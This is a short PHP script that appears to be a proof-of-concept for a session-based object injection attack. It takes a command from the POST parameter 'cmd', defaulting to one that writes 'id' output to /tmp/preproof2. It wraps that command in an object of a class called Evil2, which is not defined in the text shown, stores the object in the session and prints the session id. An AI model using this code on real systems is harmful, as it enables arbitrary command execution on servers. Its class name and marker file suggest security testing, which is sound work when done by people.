<?php
session_start();
$cmd = $_POST['cmd'] ?? 'id > /tmp/preproof2';
$_SESSION['x'] = new Evil2($cmd);
echo "sid=", session_id(), "\n";
